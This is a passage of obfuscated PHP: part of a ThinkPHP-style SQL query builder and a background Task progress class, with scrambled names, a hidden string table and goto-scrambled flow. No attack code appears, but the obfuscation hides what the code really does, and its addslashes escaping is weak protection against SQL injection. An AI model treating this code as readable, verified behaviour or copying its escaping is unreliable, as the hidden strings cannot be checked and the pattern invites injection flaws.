$this->exp[strtolower($DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±][0])] : $Eè¸´•Â–†[912]; if (!$d”®å„»„© && is_array($DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±]) && in_array($DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±][0], array($Eè¸´•Â–†[912], $Eè¸´•Â–†[929], $Eè¸´•Â–†[930], $Eè¸´•Â–†[931], $Eè¸´•Â–†[932], $Eè¸´•Â–†[933]))) { $d”®å„»„© = $DÛÇö×ÀÕ—[$e±¯ÚÏ¡Õ±][0]; } $DƒÓ„øÚÚã .= $Eè¸´•Â–†[265] . $F½è“…ß² . $Eè¸´•Â–†[50] . $d”®å„»„© . $Eè¸´•Â–†[50] . $this->parseValue($d«é½Ì¨ñõ) . $Eè¸´•Â–†[936] . $Eæ¨áĞÕ . $Eè¸´•Â–†[50]; } } $DƒÓ„øÚÚã = substr($DƒÓ„øÚÚã, 0, -4); } } else { $DƒÓ„øÚÚã .= $F½è“…ß² . $Eè¸´•Â–†[940] . $this->parseValue($DÛÇö×ÀÕ—); } return $DƒÓ„øÚÚã; } protected function parseThinkWhere($CÈ®Û§¸ã‰, $A–íğ‰Òäˆ) { $Aî–‚ùùÕõ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B´Ò ÅÎÄ = $Aî–‚ùùÕõ[33]; switch ($CÈ®Û§¸ã‰) { case $Aî–‚ùùÕõ[357]: $B´Ò ÅÎÄ = $A–íğ‰Òäˆ; break; case $Aî–‚ùùÕõ[923]: $B´Ò ÅÎÄ = is_string($A–íğ‰Òäˆ) ? $A–íğ‰Òäˆ : substr($this->parseWhere($A–íğ‰Òäˆ), 6); break; case $Aî–‚ùùÕõ[941]: parse_str($A–íğ‰Òäˆ, $CãñÎöŠê); if (isset($CãñÎöŠê[$Aî–‚ùùÕõ[918]])) { $Cˆ’ñ‚»™˜ = $Aî–‚ùùÕõ[50] . strtoupper($CãñÎöŠê[$Aî–‚ùùÕõ[918]]) . $Aî–‚ùùÕõ[50]; unset($CãñÎöŠê[$Aî–‚ùùÕõ[918]]); } else { $Cˆ’ñ‚»™˜ = $Aî–‚ùùÕõ[922]; } $døã­ğ¶„Õ = array(); foreach ($CãñÎöŠê as $Cğ½ÔÇ¢ï => $DÃ˜…˜áĞ±) { $døã­ğ¶„Õ[] = $this->parseKey($Cğ½ÔÇ¢ï) . $Aî–‚ùùÕõ[940] . $this->parseValue($DÃ˜…˜áĞ±); } $B´Ò ÅÎÄ = implode($Cˆ’ñ‚»™˜, $døã­ğ¶„Õ); break; } return $B´Ò ÅÎÄ; } protected function parseLimit($bòÑŞÈ¢) { $FÀ’—µˆ  =& $_SERVER[í¤âËÚ£¶íÊ¢]; return !empty($bòÑŞÈ¢) ? $FÀ’—µˆ [48] . $bòÑŞÈ¢ . $FÀ’—µˆ [50] : $FÀ’—µˆ [33]; } protected function parseJoin($C³©¦™†­Û) { $BÎÖŒÒ§ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fÊè÷‚£”× = $BÎÖŒÒ§[33]; if (!empty($C³©¦™†­Û)) { if (is_array($C³©¦™†­Û)) { foreach ($C³©¦™†­Û as $Fä·”Ì™Ó => $dÆ¥ ¤Œë”) { if (!1 !== stripos($dÆ¥ ¤Œë”, $BÎÖŒÒ§[942])) { $fÊè÷‚£”× .= $BÎÖŒÒ§[50] . $dÆ¥ ¤Œë”; } else { $fÊè÷‚£”× .= $BÎÖŒÒ§[943] . $dÆ¥ ¤Œë”; } } } else { $fÊè÷‚£”× .= $BÎÖŒÒ§[943] . $C³©¦™†­Û; } } $fÊè÷‚£”× = preg_replace($BÎÖŒÒ§[944], think_config($BÎÖŒÒ§[850]) . $BÎÖŒÒ§[945], $fÊè÷‚£”×); return $fÊè÷‚£”×; } protected function parseOrder($A¯Éš¨„„) { $D¼Ÿí¾ìæô =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_array($A¯Éš¨„„)) { $eôá¨ìË¹Š = array(); foreach ($A¯Éš¨„„ as $a†ğäİÕÆÑ => $B¥¨ˆ¦âÙÕ) { if (is_numeric($a†ğäİÕÆÑ)) { $eôá¨ìË¹Š[] = $this->parseKey($B¥¨ˆ¦âÙÕ); } else { $B¥¨ˆ¦âÙÕ = in_array(strtoupper(trim($B¥¨ˆ¦âÙÕ)), array($D¼Ÿí¾ìæô[946], $D¼Ÿí¾ìæô[947])) ? $D¼Ÿí¾ìæô[50] . $B¥¨ˆ¦âÙÕ : $D¼Ÿí¾ìæô[33]; if (preg_match($D¼Ÿí¾ìæô[948], $a†ğäİÕÆÑ)) { $eôá¨ìË¹Š[] = $this->parseKey($a†ğäİÕÆÑ) . $B¥¨ˆ¦âÙÕ; } else { think_exception($D¼Ÿí¾ìæô[949] . $a†ğäİÕÆÑ); } } } $A¯Éš¨„„ = implode($D¼Ÿí¾ìæô[47], $eôá¨ìË¹Š); } return !empty($A¯Éš¨„„) ? $D¼Ÿí¾ìæô[950] . $A¯Éš¨„„ : $D¼Ÿí¾ìæô[33]; } protected function parseGroup($D³±£ÜÎÔÉ) { $DŸâÇ’Á±ê =& $_SERVER[í¤âËÚ£¶íÊ¢]; return !empty($D³±£ÜÎÔÉ) ? $DŸâÇ’Á±ê[951] . $D³±£ÜÎÔÉ : $DŸâÇ’Á±ê[33]; } protected function parseHaving($bâœòâÙ¤Ô) { $Báš”ù­‡„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return !empty($bâœòâÙ¤Ô) ? $Báš”ù­‡„[952] . $bâœòâÙ¤Ô : $Báš”ù­‡„[33]; } protected function parseComment($dƒĞò¯áÆ) { $d‘§ßâ¿­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return !empty($dƒĞò¯áÆ) ? $d‘§ßâ¿­[953] . $dƒĞò¯áÆ . $d‘§ßâ¿­[954] : $d‘§ßâ¿­[33]; } protected function parseDistinct($e¹˜–å“¡ö) { $bÌ¹¾’°’Ï =& $_SERVER[í¤âËÚ£¶íÊ¢]; return !empty($e¹˜–å“¡ö) ? $bÌ¹¾’°’Ï[955] : $bÌ¹¾’°’Ï[33]; } protected function parseUnion($aâØ˜¿ê—ê) { $aà…Áñ›“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($aâØ˜¿ê—ê)) { return $aà…Áñ›“[33]; } if (isset($aâØ˜¿ê—ê[$aà…Áñ›“[353]])) { $f…’‡×À§ğ = $aà…Áñ›“[956]; unset($aâØ˜¿ê—ê[$aà…Áñ›“[353]]); } else { $f…’‡×À§ğ = $aà…Áñ›“[957]; } foreach ($aâØ˜¿ê—ê as $aÙô‹²ËÄ) { $C•Š¨Áäî˜[] = $f…’‡×À§ğ . (is_array($aÙô‹²ËÄ) ? $this->buildSelectSql($aÙô‹²ËÄ) : $aÙô‹²ËÄ); } return implode($aà…Áñ›“[50], $C•Š¨Áäî˜); } public function insert($f¬İ—‚íñ½, $BŸ‚Ş•‰ÖÓ = array(), $FáÄé‰—ñƒ = false) { goto BâÌÇ²‹» ; f×´»ŒÈê: $fåìâŞóÇÅ .= $this->parseComment(!empty($BŸ‚Ş•‰ÖÓ[$Cç¬°—„È[359]]) ? $BŸ‚Ş•‰ÖÓ[$Cç¬°—„È[359]] : $Cç¬°—„È[33]); return $this->execute($fåìâŞóÇÅ, $this->parseBind(!empty($BŸ‚Ş•‰ÖÓ[$Cç¬°—„È[290]]) ? $BŸ‚Ş•‰ÖÓ[$Cç¬°—„È[290]] : array())); goto b©óÖÕ·¦ª; C­ÂŸ»Åìİ: foreach ($f¬İ—‚íñ½ as $b³¨½ì†´‹ => $a„ˆ“É¢²¥) { if (is_array($a„ˆ“É¢²¥) && $Cç¬°—„È[302] == $a„ˆ“É¢²¥[0]) { $B™ôË‹Áî’[] = $this->parseKey($b³¨½ì†´‹); $F»®¢ÊùÉ[] = $a„ˆ“É¢²¥[1]; } elseif (is_scalar($a„ˆ“É¢²¥) || is_null($a„ˆ“É¢²¥)) { $B™ôË‹Áî’[] = $this->parseKey($b³¨½ì†´‹); $F»®¢ÊùÉ[] = $this->parseValue($a„ˆ“É¢²¥); } } $fåìâŞóÇÅ = ($FáÄé‰—ñƒ ? $Cç¬°—„È[828] : $Cç¬°—„È[829]) . $Cç¬°—„È[830] . $this->parseTable($BŸ‚Ş•‰ÖÓ[$Cç¬°—„È[284]]) . $Cç¬°—„È[824] . implode($Cç¬°—„È[47], $B™ôË‹Áî’) . $Cç¬°—„È[825] . implode($Cç¬°—„È[47], $F»®¢ÊùÉ) . $Cç¬°—„È[826]; $fåìâŞóÇÅ .= $this->parseLock(isset($BŸ‚Ş•‰ÖÓ[$Cç¬°—„È[781]]) ? $BŸ‚Ş•‰ÖÓ[$Cç¬°—„È[781]] : !1); goto f×´»ŒÈê; BâÌÇ²‹» : $Cç¬°—„È =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F»®¢ÊùÉ = $B™ôË‹Áî’ = array(); $this->model = $BŸ‚Ş•‰ÖÓ[$Cç¬°—„È[286]]; goto C­ÂŸ»Åìİ; b©óÖÕ·¦ª: } public function selectInsert($cª°ñğèâ, $AŠ†©±ˆÃ, $C ÉíÕÓß = array()) { goto ağñÄ¢Ø¯®; F·Œ‘†Ú³Ğ: return $this->execute($fÀ‘Ş³§µ, $this->parseBind(!empty($C ÉíÕÓß[$eƒäÌÇÅÃÙ[290]]) ? $C ÉíÕÓß[$eƒäÌÇÅÃÙ[290]] : array())); goto e§íÍ‚Ï¥ò; ağñÄ¢Ø¯®: $eƒäÌÇÅÃÙ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->model = $C ÉíÕÓß[$eƒäÌÇÅÃÙ[286]]; if (is_string($cª°ñğèâ)) { $cª°ñğèâ = explode($eƒäÌÇÅÃÙ[47], $cª°ñğèâ); } goto EÄ¶ÉğÈÍ’; EÄ¶ÉğÈÍ’: array_walk($cª°ñğèâ, array($this, $eƒäÌÇÅÃÙ[827])); $fÀ‘Ş³§µ = $eƒäÌÇÅÃÙ[958] . $this->parseTable($AŠ†©±ˆÃ) . $eƒäÌÇÅÃÙ[824] . implode($eƒäÌÇÅÃÙ[47], $cª°ñğèâ) . $eƒäÌÇÅÃÙ[936]; $fÀ‘Ş³§µ .= $this->buildSelectSql($C ÉíÕÓß); goto F·Œ‘†Ú³Ğ; e§íÍ‚Ï¥ò: } public function update($fôÜæ²„ˆÎ, $fÌ³Ÿ¿ŞÕ) { $e‚¹Á˜æˆÜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->model = $fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[286]]; $d½°ç¹ˆ‹« = $e‚¹Á˜æˆÜ[959] . $this->parseTable($fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[284]]) . $this->parseSet($fôÜæ²„ˆÎ) . $this->parseWhere(!empty($fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[280]]) ? $fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[280]] : $e‚¹Á˜æˆÜ[33]) . $this->parseOrder(!empty($fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[371]]) ? $fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[371]] : $e‚¹Á˜æˆÜ[33]) . $this->parseLimit(!empty($fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[297]]) ? $fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[297]] : $e‚¹Á˜æˆÜ[33]) . $this->parseLock(isset($fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[781]]) ? $fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[781]] : !1) . $this->parseComment(!empty($fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[359]]) ? $fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[359]] : $e‚¹Á˜æˆÜ[33]); return $this->execute($d½°ç¹ˆ‹«, $this->parseBind(!empty($fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[290]]) ? $fÌ³Ÿ¿ŞÕ[$e‚¹Á˜æˆÜ[290]] : array())); } public function delete($c’·ÕÌÕ™  = array()) { $cÍ‘òƒ¨òï =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->model = $c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[286]]; $E­çí‰²ïª = $cÍ‘òƒ¨òï[960] . $this->parseTable($c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[284]]) . $this->parseWhere(!empty($c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[280]]) ? $c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[280]] : $cÍ‘òƒ¨òï[33]) . $this->parseOrder(!empty($c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[371]]) ? $c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[371]] : $cÍ‘òƒ¨òï[33]) . $this->parseLimit(!empty($c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[297]]) ? $c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[297]] : $cÍ‘òƒ¨òï[33]) . $this->parseLock(isset($c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[781]]) ? $c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[781]] : !1) . $this->parseComment(!empty($c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[359]]) ? $c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[359]] : $cÍ‘òƒ¨òï[33]); return $this->execute($E­çí‰²ïª, $this->parseBind(!empty($c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[290]]) ? $c’·ÕÌÕ™ [$cÍ‘òƒ¨òï[290]] : array())); } public function select($cÈîÆ°ªí = array()) { goto fË‘ëï–ê¥; dÃÅ«›äŒ‘: if ($CµÍ‡ìá && !1 !== $CÎ•¢—Ñõ¥) { think_cache($b©äèÅÜÅö, $CÎ•¢—Ñõ¥, $CµÍ‡ìá); } return $CÎ•¢—Ñõ¥; goto cÂ±Š•À®’; fË‘ëï–ê¥: $DƒèŸ¥ÊË³ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->model = $cÈîÆ°ªí[$DƒèŸ¥ÊË³[286]]; $eçÎ±Á›ØÙ = $this->buildSelectSql($cÈîÆ°ªí); goto bÚšˆøÚ¯ë; bÚšˆøÚ¯ë: $CµÍ‡ìá = isset($cÈîÆ°ªí[$DƒèŸ¥ÊË³[354]]) ? $cÈîÆ°ªí[$DƒèŸ¥ÊË³[354]] : !1; if ($CµÍ‡ìá) { $b©äèÅÜÅö = is_string($CµÍ‡ìá[$DƒèŸ¥ÊË³[102]]) ? $CµÍ‡ìá[$DƒèŸ¥ÊË³[102]] : $DƒèŸ¥ÊË³[961] . md5($eçÎ±Á›ØÙ); $Cíœâ¸Â®¥ = think_cache($b©äèÅÜÅö, $DƒèŸ¥ÊË³[33], $CµÍ‡ìá); if (!1 !== $Cíœâ¸Â®¥) { return $Cíœâ¸Â®¥; } } $CÎ•¢—Ñõ¥ = $this->query($eçÎ±Á›ØÙ, $this->parseBind(!empty($cÈîÆ°ªí[$DƒèŸ¥ÊË³[290]]) ? $cÈîÆ°ªí[$DƒèŸ¥ÊË³[290]] : array())); goto dÃÅ«›äŒ‘; cÂ±Š•À®’: } public function buildSelectSql($Aä²É¿É  = array()) { goto c¶êàö£ô; c¶êàö£ô: $d¬Ø½ß¾÷ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($Aä²É¿É [$d¬Ø½ß¾÷[358]])) { if (strpos($Aä²É¿É [$d¬Ø½ß¾÷[358]], $d¬Ø½ß¾÷[47])) { list($có‹ç‘Ó¬, $d‰‡Ş³µâŒ) = explode($d¬Ø½ß¾÷[47], $Aä²É¿É [$d¬Ø½ß¾÷[358]]); } else { $có‹ç‘Ó¬ = $Aä²É¿É [$d¬Ø½ß¾÷[358]]; } $có‹ç‘Ó¬ = $có‹ç‘Ó¬ ? $có‹ç‘Ó¬ : 1; $d‰‡Ş³µâŒ = isset($d‰‡Ş³µâŒ) ? $d‰‡Ş³µâŒ : (is_numeric($Aä²É¿É [$d¬Ø½ß¾÷[297]]) ? $Aä²É¿É [$d¬Ø½ß¾÷[297]] : 20); $F„…™óÊÉ­ = $d‰‡Ş³µâŒ * ((int) $có‹ç‘Ó¬ - 1); $Aä²É¿É [$d¬Ø½ß¾÷[297]] = $F„…™óÊÉ­ . $d¬Ø½ß¾÷[47] . $d‰‡Ş³µâŒ; } if (think_config($d¬Ø½ß¾÷[962])) { $D›¥¸ˆ˜©Ê = $d¬Ø½ß¾÷[963] . md5(serialize($Aä²É¿É )); $e¶ÑÙğ»Û¹ = think_cache($D›¥¸ˆ˜©Ê); if ($e¶ÑÙğ»Û¹) { return $e¶ÑÙğ»Û¹; } } goto f¨ŞàÂè‹; Fç´¶òÁ†Æ: return $eŠ»ÆÈù„Î; goto B¬ğó¥°Õ; f¨ŞàÂè‹: $eŠ»ÆÈù„Î = $this->parseSql($this->selectSql, $Aä²É¿É ); $eŠ»ÆÈù„Î .= $this->parseLock(isset($Aä²É¿É [$d¬Ø½ß¾÷[781]]) ? $Aä²É¿É [$d¬Ø½ß¾÷[781]] : !1); if (isset($D›¥¸ˆ˜©Ê)) { think_cache($D›¥¸ˆ˜©Ê, $eŠ»ÆÈù„Î); } goto Fç´¶òÁ†Æ; B¬ğó¥°Õ: } public function parseSql($EÙ½æ†¶èŞ, $d¯ïŠ‹‚õƒ = array()) { $D¸ŸÙù¾Ìí =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÙ½æ†¶èŞ = str_replace(array($D¸ŸÙù¾Ìí[964], $D¸ŸÙù¾Ìí[965], $D¸ŸÙù¾Ìí[966], $D¸ŸÙù¾Ìí[967], $D¸ŸÙù¾Ìí[968], $D¸ŸÙù¾Ìí[969], $D¸ŸÙù¾Ìí[970], $D¸ŸÙù¾Ìí[971], $D¸ŸÙù¾Ìí[972], $D¸ŸÙù¾Ìí[973], $D¸ŸÙù¾Ìí[974]), array($this->parseTable("{$d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[284]]}"), $this->parseDistinct(isset($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[975]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[975]] : !1), $this->parseField(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[278]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[278]] : $D¸ŸÙù¾Ìí[191]), $this->parseJoin(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[287]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[287]] : $D¸ŸÙù¾Ìí[33]), $this->parseWhere(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[280]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[280]] : $D¸ŸÙù¾Ìí[33]), $this->parseGroup(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[976]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[976]] : $D¸ŸÙù¾Ìí[33]), $this->parseHaving(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[977]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[977]] : $D¸ŸÙù¾Ìí[33]), $this->parseOrder(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[371]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[371]] : $D¸ŸÙù¾Ìí[33]), $this->parseLimit(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[297]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[297]] : $D¸ŸÙù¾Ìí[33]), $this->parseUnion(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[352]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[352]] : $D¸ŸÙù¾Ìí[33]), $this->parseComment(!empty($d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[359]]) ? $d¯ïŠ‹‚õƒ[$D¸ŸÙù¾Ìí[359]] : $D¸ŸÙù¾Ìí[33])), $EÙ½æ†¶èŞ); return $EÙ½æ†¶èŞ; } public function getLastSql($b±ª¶ñˆŒó = '') { return $b±ª¶ñˆŒó ? $this->modelSql[$b±ª¶ñˆŒó] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Dâ®àÄÙç) { return addslashes($Dâ®àÄÙç); } public function setModel($cÁ¹´ÃâƒŞ) { $this->model = $cÁ¹´ÃâƒŞ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto f›ÖÆ²…­‚; c×¦‹Í¼: class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\156\151\156\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($FÌ±ÊÃâ‘Ğ, $fó¡Ö½ˆ“º = '', $B¶Ëğí©îò = 0, $CÄì¨¿Şªç = '') { goto dºØ¬‘É”; b•Éíø‡ëŠ: $this->startAfter(); Hook::trigger($aéŠã«ìùÛ[1497], $this->task); $this->task[$aéŠã«ìùÛ[1490]] = timeFloat(); goto E¥÷Œ–ø“; föÀçŠ®†Ô: $GLOBALS[$aéŠã«ìùÛ[1493]] = 1; Hook::bind($aéŠã«ìùÛ[1453], array($this, $aéŠã«ìùÛ[1494])); Hook::bind($aéŠã«ìùÛ[1495], array($this, $aéŠã«ìùÛ[1496])); goto b•Éíø‡ëŠ; dºØ¬‘É”: $aéŠã«ìùÛ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (self::get($FÌ±ÊÃâ‘Ğ)) { return; } $this->task = array($aéŠã«ìùÛ[397] => $FÌ±ÊÃâ‘Ğ, $aéŠã«ìùÛ[1487] => USER_ID, $aéŠã«ìùÛ[1393] => $CÄì¨¿Şªç, $aéŠã«ìùÛ[29] => $fó¡Ö½ˆ“º, $aéŠã«ìùÛ[984] => $aéŠã«ìùÛ[33], $aéŠã«ìùÛ[982] => $B¶Ëğí©îò, $aéŠã«ìùÛ[996] => 0, $aéŠã«ìùÛ[1488] => 0, $aéŠã«ìùÛ[1489] => 0, $aéŠã«ìùÛ[725] => timeFloat(), $aéŠã«ìùÛ[724] => 0, $aéŠã«ìùÛ[1490] => 0, $aéŠã«ìùÛ[1491] => 0, $aéŠã«ìùÛ[1492] => 0, $aéŠã«ìùÛ[694] => $aéŠã«ìùÛ[1451]); goto föÀçŠ®†Ô; E¥÷Œ–ø“: } public function end() { goto Dáö›Ò³œ; aÅƒÖ—¥ó…: Hook::unbind($CæİäœêùÀ[1495], array($this, $CæİäœêùÀ[1496])); $this->endAfter(); $this->task = !1; goto a“Æœ¶®ĞŒ; Dáö›Ò³œ: $CæİäœêùÀ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->task) { return; } if ($this->task[$CæİäœêùÀ[1490]]) { self::valueSet($this->task[$CæİäœêùÀ[397]], !1); } goto FÕî‰‰×õÜ; FÕî‰‰×õÜ: $EÕé»Òƒœò = timeFloat() - $this->task[$CæİäœêùÀ[725]]; self::log($CæİäœêùÀ[1498] . $this->task[$CæİäœêùÀ[397]] . $CæİäœêùÀ[1499] . $EÕé»Òƒœò . $CæİäœêùÀ[1500]); Hook::unbind($CæİäœêùÀ[1453], array($this, $CæİäœêùÀ[1494])); goto aÅƒÖ—¥ó…; a“Æœ¶®ĞŒ: } public function update($D±ÙÃíæ½ = 0, $dõ³ŠæÙïÏ = false) { goto BÔ–¾Ú±Œä; B•÷õ‹‹¸©: $A‹äò‚…¡é = self::get($c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[397]]); $aÆ‡ŸÒã… = $A‹äò‚…¡é[$Eƒ‡Œ×²ø[694]]; if ($aÆ‡ŸÒã… == self::STATYS_KILL) { $FÚ«ìÌåè¢ = array($Eƒ‡Œ×²ø[1501] => LNG($Eƒ‡Œ×²ø[1502]), $Eƒ‡Œ×²ø[1046] => !1); Cache::set($Eƒ‡Œ×²ø[1503] . $this->task[$Eƒ‡Œ×²ø[397]], $FÚ«ìÌåè¢, 30); $this->end(); die; } else { if ($aÆ‡ŸÒã… == self::STATYS_STOP) { $b·ŞÛ¹ñ = 2; $A‹äò‚…¡é[$Eƒ‡Œ×²ø[1491]] += $b·ŞÛ¹ñ; self::valueSet($c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[397]], $A‹äò‚…¡é); sleep($b·ŞÛ¹ñ); $this->update(); return; } } goto Aä¦Ú‘ˆ; Aä¦Ú‘ˆ: $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[694]] = $aÆ‡ŸÒã… ? $aÆ‡ŸÒã… : $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[694]]; $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1491]] = $A‹äò‚…¡é[$Eƒ‡Œ×²ø[1491]] ? $A‹äò‚…¡é[$Eƒ‡Œ×²ø[1491]] : 0; $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1490]] = timeFloat(); goto aŒÕË…ë‹ó; aŒÕË…ë‹ó: Hook::trigger($Eƒ‡Œ×²ø[1504], $c÷¬½ÙĞ‘¿); self::valueSet($c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[397]], $c÷¬½ÙĞ‘¿); goto F’ˆÏ¡¾É©; EÖ¹“‚©â²: $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[996]] += $D±ÙÃíæ½; $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[724]] = timeFloat(); if ($c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[982]]) { if ($c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[982]] < $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[996]]) { $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[982]] = $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[996]]; } $BÀ‡è–¨ = timeFloat() - $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[725]] - $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1491]]; $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1488]] = $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[996]] / $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[982]]; $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1489]] = $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[996]] / $BÀ‡è–¨; if ($c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1488]] > 0) { $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1492]] = $BÀ‡è–¨ * (1 - $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1488]]) / $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1488]]; } $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1492]] = $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1492]] <= 0 ? 0 : $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1492]]; } goto F‘œâÏÜÒ; BÔ–¾Ú±Œä: $Eƒ‡Œ×²ø =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c÷¬½ÙĞ‘¿ =& $this->task; if (!$c÷¬½ÙĞ‘¿) { return; } goto EÖ¹“‚©â²; F‘œâÏÜÒ: $this->updateAfter(); $CôÈ«äƒŒÇ = 0.2; if (timeFloat() - $c÷¬½ÙĞ‘¿[$Eƒ‡Œ×²ø[1490]] < $CôÈ«äƒŒÇ && !$dõ³ŠæÙïÏ) { return; } goto B•÷õ‹‹¸©; F’ˆÏ¡¾É©: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Fè“¡–ê¤³) { $Bù¯§ŸåÀ =& $_SERVER[í¤âËÚ£¶íÊ¢]; Cache::set($Bù¯§ŸåÀ[1503] . $this->task[$Bù¯§ŸåÀ[397]], $Fè“¡–ê¤³, 60); return $Fè“¡–ê¤³; } public static function get($c»š‚äØŒŠ) { return self::valueGet($c»š‚äØŒŠ); } public static function listData() { $a—ë¯ŸİÍº = self::valueGet(); return array_sort_by($a—ë¯ŸİÍº, $_SERVER[í¤âËÚ£¶íÊ¢][725], !0); } public static function kill($b›¾È‚š­ ) { return self::changeStatus($b›¾È‚š­ , self::STATYS_KILL); } public static function stop($dğ°ÎË«„) { return self::changeStatus($dğ°ÎË«„, self::STATYS_STOP); } public static function restart($c Àö°èŒÖ) { return self::changeStatus($c Àö°èŒÖ, self::STATYS_RUNNING); } public static function killAll() { $BÂùêô¬Äó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f«ê‘ğŸ¹‹ = self::listData(); foreach ($f«ê‘ğŸ¹‹ as $eÄ‚ÌÄƒ—É) { self::kill($eÄ‚ÌÄƒ—É[$BÂùêô¬Äó[397]]); } sleep(2); foreach ($f«ê‘ğŸ¹‹ as $eÄ‚ÌÄƒ—É) { self::valueSet($eÄ‚ÌÄƒ—É[$BÂùêô¬Äó[397]], !1); } } private static function changeStatus($D‘‹©ˆãµ, $Bãï“ìˆ÷) { goto b§Úğö†‹; b§Úğö†‹: 